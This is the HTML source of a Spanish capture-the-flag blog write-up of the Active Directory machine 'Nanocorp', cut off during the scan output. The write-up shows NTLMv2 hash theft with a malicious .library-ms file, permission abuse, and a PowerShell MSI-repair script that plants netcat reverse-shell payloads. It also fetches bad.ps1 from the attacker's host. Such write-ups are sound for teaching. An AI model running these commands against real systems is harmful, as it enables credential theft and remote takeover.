+    "Hard", "ActiveDirectory", "Hash-Stealer", "AddSelf", "ForceChangePassword", "winPEAS", "DFSCoerce", "MSI-Repair"
+  ],
+  "articleBody": "\nReconocimiento nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.182.154 -oG ports Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-08 22:33 CET Initiating SYN Stealth Scan at 22:33 Scanning 10.129.182.154 [65535 ports] Discovered open port 80/tcp on 10.129.182.154 Discovered open port 139/tcp on 10.129.182.154 Discovered open port 135/tcp on 10.129.182.154 Discovered open port 53/tcp on 10.129.182.154 Discovered open port 445/tcp on 10.129.182.154 Discovered open port 3389/tcp on 10.129.182.154 Discovered open port 63955/tcp on 10.129.182.154 Discovered open port 593/tcp on 10.129.182.154 Discovered open port 63977/tcp on 10.129.182.154 Discovered open port 6556/tcp on 10.129.182.154 Discovered open port 63947/tcp on 10.129.182.154 Discovered open port 3268/tcp on 10.129.182.154 Discovered open port 49671/tcp on 10.129.182.154 Discovered open port 5986/tcp on 10.129.182.154 Discovered open port 9389/tcp on 10.129.182.154 Discovered open port 49664/tcp on 10.129.182.154 Discovered open port 389/tcp on 10.129.182.154 Discovered open port 3269/tcp on 10.129.182.154 Discovered open port 49668/tcp on 10.129.182.154 Discovered open port 636/tcp on 10.129.182.154 Discovered open port 88/tcp on 10.129.182.154 Discovered open port 464/tcp on 10.129.182.154 Completed SYN Stealth Scan at 22:33, 26.36s elapsed (65535 total ports) Nmap scan report for 10.129.182.154 Host is up, received user-set (0.10s latency). Scanned at 2025-11-08 22:33:17 CET for 27s Not shown: 65513 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 5986/tcp open wsmans syn-ack ttl 127 6556/tcp open checkmk-agent syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 49671/tcp open unknown syn-ack ttl 127 63947/tcp open unknown syn-ack ttl 127 63955/tcp open unknown syn-ack ttl 127 63977/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.43 seconds Raw packets sent: 131061 (5.767MB) | Rcvd: 35 (1.540KB) ports.py ports 🔍 Puertos encontrados: ➜ 53 ➜ 80 ➜ 88 ➜ 135 ➜ 139 ➜ 389 ➜ 445 ➜ 464 ➜ 593 ➜ 636 ➜ 3268 ➜ 3269 ➜ 3389 ➜ 5986 ➜ 6556 ➜ 9389 ➜ 49664 ➜ 49668 ➜ 49671 ➜ 63947 ➜ 63955 ➜ 63977 ¡Puertos copiados en el portapapeles! nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5986,6556,9389,49664,49668,49671,63947,63955,63977 10.129.182.154 -oN targeted Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-08 22:35 CET Nmap scan report for 10.129.182.154 Host is up (0.20s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12) |_http-title: Did not follow redirect to http://nanocorp.htb/ |_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-11-09 04:34:29Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=DC01.nanocorp.htb | Not valid before: 2025-10-20T01:58:09 |_Not valid after: 2026-04-21T01:58:09 |_ssl-date: 2025-11-09T04:36:06+00:00; +6h59m04s from scanner time. 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | ssl-cert: Subject: commonName=dc01.nanocorp.htb | Subject Alternative Name: DNS:dc01.nanocorp.htb | Not valid before: 2025-04-06T22:58:43 |_Not valid after: 2026-04-06T23:18:43 |_ssl-date: TLS randomness does not represent time |_http-server-header: Microsoft-HTTPAPI/2.0 | tls-alpn: |_ http/1.1 |_http-title: Not Found 6556/tcp open check_mk check_mk extension for Nagios 2.1.0p10 9389/tcp open mc-nmf .NET Message Framing 49664/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49671/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 63947/tcp open msrpc Microsoft Windows RPC 63955/tcp open msrpc Microsoft Windows RPC 63977/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 311: |_ Message signing enabled and required |_clock-skew: mean: 6h59m04s, deviation: 0s, median: 6h59m03s | smb2-time: | date: 2025-11-09T04:35:28 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 107.71 seconds Enumeración web En el escaneo con nmap vemos que tenemos el puerto web expuesto, entonces lo primero que hacemos es tratar de enumerarlo para buscar posibles vectores de ataque.\nCuando empezamos a enumerar la web en una de las funcionalidades vemos que existe un subdominio llamado hire.\nEntonces lo añadimos al /etc/hosts y entramos para ver que se trata. Vemos que tenemos un panel en el cual podemos subir un zip junto con nuestra información para intentar formar parte de su equipo.\nEn un principio intento realizar subida de archivos php para conseguir una shell en la máquina pero no consigo que me funcione, también intento realizar un Zip Slip aunque tampoco tengo éxito.\nDurante el proceso vemos que la propia aplicación al subir el archivo, nos comenta que el zip es descomprimido.\nEl siguiente paso que doy es entonces intentar realizar un spoofing para robar las credenciales creando una librería maliciosa que apunte a mi servidor smb para recibir los hashes NTLMv2.\nRobo de hash NTLMv2 - .library-ms Primero necesitamos crear la librería maliciosa (.library-ms) la cual tiene una url apuntando a nuestro servidor smb.\nUna vez con el archivo lo enviamos al zip con el siguiente comando:\nzip malicius.zip .library-ms Ahora creamos nuestro propio servidor smb son smbserver.py y subimos el zip malicioso y al momento veremos como recibimos los hash NTLMv2 de web_svc.\nsmbserver.py smbFolder $(pwd) -smb2support Y usando hashcat creackeamos el hash:\nhashcat -m 5600 --force -a 0 coercer_hash.txt /usr/share/seclists/Passwords/Leaked-Database/rockyou.txt WEB_SVC:dksehdgh712!@# Comprobación de credenciales:\nnxc smb dc01.nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' Bloodhound Enumeration Una vez con las credenciales el siguiente paso que doy es lanzar un escaneo con python-bloodhound y si no veo nada interesante procederé a enumerar carpetas compartidas y usuarios.\nbloodhound-python -u 'web_svc' -p 'dksehdgh712!@#' -d nanocorp.htb -ns 10.129.130.136 -c all --zip Rápidamente vemos los permisos que nuestro usuario actual tiene sobre el grupo IT_SUPPORT el cual nos permite añadirnos a el.\nAbusando de permisos AddSelf - bloodyAD Añadimos al usuario web_svc al grupo IT_SUPPORT para heredar sus permisos:\nbloodyAD --host 10.129.130.136 -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' add groupMember 'IT_SUPPORT' 'web_svc' Abusando de permisos ForceChangePassword - net rpc Una vez añadido el usuario al grupo IT_SUPPORT si revisamos los permisos del grupo, vemos que los miembros del grupo tienen la capacidad de cambiar la contraseña al usuario MONITORING_SVC.\nnet rpc password \"monitoring_svc\" \"Password01\" -U 'nanocorp.htb'/'web_svc'%'dksehdgh712!@#' -S 10.129.130.136 Shell as monitoring_svc Y ahora compruebo que el cambio de contraseña haya sido efectivo, pero me da un error de que la cuenta tiene una restricción:\nnxc smb dc01.nanocorp.htb -u 'monitoring_svc' -p 'Password01' [!NOTE] Porque ocurre este error? El usuario “monitoring_svc” es miembro del Grupo Protected Users, con lo cual tiene la autenticación NTLM des-habilitada. Para poder autenticar-nos con este usuario necesitaremos usar el protocolo kerberos o SSL.\nPara revertir este error lo que hago es autenticar-me a través de kerberos directamente:\n#Nos sincronizamos con la hora del servidor sudo ntpdate -u 10.129.130.136 nxc ldap dc01.nanocorp.htb -u 'monitoring_svc' -p 'Password01' -k Como ahora si que nos ha aceptado las credenciales, solicitamos el Ticket Garanting Ticket (TGT) para el usuario monitoring_svc:\ngetTGT.py rustykey.htb/rr.parker:'8#t5HE8L!W3A' -dc-ip 10.10.11.75 export KRB5CCNAME=monitoring_svc.ccache También edito el archivo krb5.conf:\n#Editamos el archivo krb5.conf [libdefaults] default_realm = NANOCORP.HTB ticket_lifetime = 24h renew_lifetime = 7d forwardable = true rdns = false [realms] NANOCORP.HTB = { kdc = DC01.nanocorp.htb admin_server = DC01.nanocorp.htb default_domain = nanocorp.htb } [domain_realm] .nanocorp.htb = NANOCORP.HTB nanocorp.htb = NANOCORP.HTB Una vez con todo esto pruebo a autenticar-me con evil-winrm o a través de SSL pero tengo dificultades para poder autenticar-me aun probando diferentes opciones.\nevil-winrm -u 'monitoring_svc' -p 'Password01!' -i 10.129.213.184 -S evil-winrm -r nanocorp.htb -i DC01.nanocorp.htb -p 5986 La solución que encontré es a usar evil-winrm-py que es una herramienta para ejecutar comandos en máquinas Windows a través de WinRM.\nEvil-winrm-py\n[!NOTE] Kerberos + SSL Para conseguir autenticar-nos tenemos que usar kerberos porque la autenticación NTLM esta des-habilitada tal como habiamos comentado anteriormente, además tenemos que indicar que es a través de ssl ya que el puerto winRM abierto es el 5986.\n#En el comando ejecutado indico el puerto abierto, pero al indicar la opción --SSL la herramienta ya coge automaticamente el puerto ssl. evil-winrm-py -i dc01.nanocorp.htb -k --port 5986 --ssl --no-pass Una vez hecho todo esto ya tenemos la shell como monitoring_svc además de la user flag.\nEscalada de privilegios Si miramos los permisos de monitoring_svc en bloodhound, no vemos ninguna manera de poder seguir aumentando nuestros privilegios, con lo cual trataremos de enumerar el sistema mediante la shell que acabamos de obtener.\nEnumeración del sistema - WinPeas / FAILED Repositorio Peass-ng\nUsando la herramienta que nos proporciona evil-winrm, nos subimos nuestro WinPEAS para realizar un escaneo del sistema:\nupload winPEASx64.exe .\\winPEASx64.exe Coerce Vulnerability - DFSCoerce / FAILED Internal Relay Coerce\nLuego de revisar la salida tampoco encuentro nada que me de una pista de por donde seguir, entonces pruebo a revisar si el servidor es vulnerable a algún tipo de coercer:\nnxc smb dc01.nanocorp.htb --use-kcache -M coerce_plus Viendo que tenemos varias vulnerabilidades potenciales, pruebo a realizar el DFSCoerce.\nPara conseguir realizar el ataque me descargo esta herramienta de este repositorio DFS Coerce Python\nUna vez con ella descargada, pongo en marcha mi responder para recibir el hash del dominio que se autenticará contra mi y configuro los parámetros de la herramienta.\nresponder -I tun0 -w python3 dfscoerce.py -u 'monitoring_svc' -k -no-pass -d nanocorp.htb 10.10.15.142 dc01.nanocorp.htb Una vez ejecutada la herramienta vemos que hemos conseguido el hash NTLMv2 de DC01, pero cuando intento crackear-lo no consigo obtener la contraseña(Exhausted).\nMSI Repair (He movido el archivo nc.exe a C:\\Windows\\Temp)\nScript malicioso en powershell:\nparam( [int]$MinPID = 1000, [int]$MaxPID = 15000, [string]$LHOST = \"10.10.15.142\", [string]$LPORT = \"4444\" ) # 1. Define the malicious batch payload $NcPath = \"C:\\Windows\\Temp\\nc.exe\" $BatchPayload = \"@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT\" # 2. Find the MSI trigger $msi = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\S-1-5-18\\Products\\*\\InstallProperties' | Where-Object { $_.DisplayName -like '*mk*' } | Select-Object -First 1).LocalPackage if (!$msi) { Write-Error \"Could not find Checkmk MSI\" return } Write-Host \"[*] Found MSI at $msi\" # 3. Spray the Read-Only files Write-Host \"[*] Seeding $MinPID to $MaxPID...\" foreach ($ctr in 0..1) { for ($num = $MinPID; $num -le $MaxPID; $num++) { $filePath = \"C:\\Windows\\Temp\\cmk_all_$($num)_$($ctr).cmd\" try { [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII) Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue } catch { # 123 } } } Write-Host \"[*] Seeding complete.\" # 4. Launch the trigger Write-Host \"[*] Triggering MSI repair...\" Start-Process \"msiexec.exe\" -ArgumentList \"/fa `\"$msi`\" /qn /l*vx C:\\Windows\\Temp\\cmk_repair.log\" -Wait Write-Host \"[*] Trigger sent. Check listener.\" Invoke-WebRequest -Uri http://10.10.15.142:8081/bad.ps1 -OutFile sc.ps1 .\\RunasCs.exe web_svc “dksehdgh712!@#” “C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\W indows\\Temp\\sc.ps1” ",
+  "wordCount" : "1845",
+  "inLanguage": "en",
+  "image":"https://borhuub.github.io/logo_machines/nanocorp.png","datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Borhub"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://borhuub.github.io/writeups/nanocorp/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Borhub Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://borhuub.github.io/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://borhuub.github.io/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://borhuub.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://borhuub.github.io/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/certs/" title="Certifications">
+                    <span>Certifications</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://borhuub.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://borhuub.github.io/writeups/">Writeups</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Nanocorp
+    </h1>
+    <div class="post-meta"><span>9 min</span>&nbsp;·&nbsp;<span>1845 words</span>&nbsp;·&nbsp;<span>Borhub</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#reconocimiento" aria-label="Reconocimiento">Reconocimiento</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-web" aria-label="Enumeración web">Enumeración web</a><ul>
+                        
+                <li>
+                    <a href="#robo-de-hash-ntlmv2---library-ms" aria-label="Robo de hash NTLMv2 - .library-ms">Robo de hash NTLMv2 - .library-ms</a></li></ul>
+                </li>
+                <li>
+                    <a href="#bloodhound-enumeration" aria-label="Bloodhound Enumeration">Bloodhound Enumeration</a><ul>
+                        
+                <li>
+                    <a href="#abusando-de-permisos-addself---bloodyad" aria-label="Abusando de permisos AddSelf - bloodyAD">Abusando de permisos AddSelf - bloodyAD</a></li>
+                <li>
+                    <a href="#abusando-de-permisos-forcechangepassword----net-rpc" aria-label="Abusando de permisos ForceChangePassword  - net rpc">Abusando de permisos ForceChangePassword  - net rpc</a></li>
+                <li>
+                    <a href="#shell-as-monitoring_svc" aria-label="Shell as monitoring_svc">Shell as monitoring_svc</a></li></ul>
+                </li>
+                <li>
+                    <a href="#escalada-de-privilegios" aria-label="Escalada de privilegios">Escalada de privilegios</a><ul>
+                        
+                <li>
+                    <a href="#enumeraci%c3%b3n-del-sistema---winpeas--failed" aria-label="Enumeración del sistema - WinPeas / FAILED">Enumeración del sistema - WinPeas / FAILED</a></li>
+                <li>
+                    <a href="#coerce-vulnerability---dfscoerce--failed" aria-label="Coerce Vulnerability - DFSCoerce / FAILED">Coerce Vulnerability - DFSCoerce / FAILED</a></li>
+                <li>
+                    <a href="#msi-repair" aria-label="MSI Repair">MSI Repair</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img alt="nanocorp_machine" loading="lazy" src="/img/nanocorp/nanocorp_machine.png"></p>
+<h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.129.182.154 -oG ports
+</span></span><span class="line"><span class="cl">Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">&#39;up&#39;</span> and scan <span class="nb">times</span> may be slower.
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-11-08 22:33 CET
+</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 22:33
+</span></span><span class="line"><span class="cl">Scanning 10.129.182.154 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Discovered open port 80/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 139/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 135/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 53/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 445/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 3389/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 63955/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 593/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 63977/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 6556/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 63947/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 3268/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 49671/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 5986/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 9389/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 49664/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 389/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 3269/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 49668/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 636/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 88/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Discovered open port 464/tcp on 10.129.182.154
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 22:33, 26.36s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.182.154
+</span></span><span class="line"><span class="cl">Host is up, received user-set <span class="o">(</span>0.10s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-11-08 22:33:17 CET <span class="k">for</span> 27s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65513</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE          REASON
+</span></span><span class="line"><span class="cl">53/tcp    open  domain           syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">80/tcp    open  http             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc            syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn      syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5         syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">593/tcp   open  http-rpc-epmap   syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">636/tcp   open  ldapssl          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3268/tcp  open  globalcatLDAP    syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  globalcatLDAPssl syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server    syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">5986/tcp  open  wsmans           syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">6556/tcp  open  checkmk-agent    syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">9389/tcp  open  adws             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49664/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49668/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49671/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">63947/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">63955/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">63977/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 26.43 seconds
+</span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">131061</span> <span class="o">(</span>5.767MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">35</span> <span class="o">(</span>1.540KB<span class="o">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ports.py ports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">🔍 Puertos encontrados:
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">53</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">80</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">88</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">135</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">139</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">389</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">445</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">464</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">593</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">636</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">3268</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">3269</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">3389</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">5986</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">6556</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">9389</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49664</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49668</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49671</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">63947</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">63955</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">63977</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">¡Puertos copiados en el portapapeles!
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5986,6556,9389,49664,49668,49671,63947,63955,63977 10.129.182.154 -oN targeted
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-11-08 22:35 CET
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.182.154
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.20s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE           VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain            Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp    open  http              Apache httpd 2.4.58 <span class="o">(</span>OpenSSL/3.1.3 PHP/8.2.12<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://nanocorp.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.58 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/3.1.3 PHP/8.2.12
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec      Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-11-09 04:34:29Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: nanocorp.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  ldapssl?
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: nanocorp.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  globalcatLDAPssl?
+</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.nanocorp.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-10-20T01:58:09
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2026-04-21T01:58:09
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-11-09T04:36:06+00:00<span class="p">;</span> +6h59m04s from scanner time.
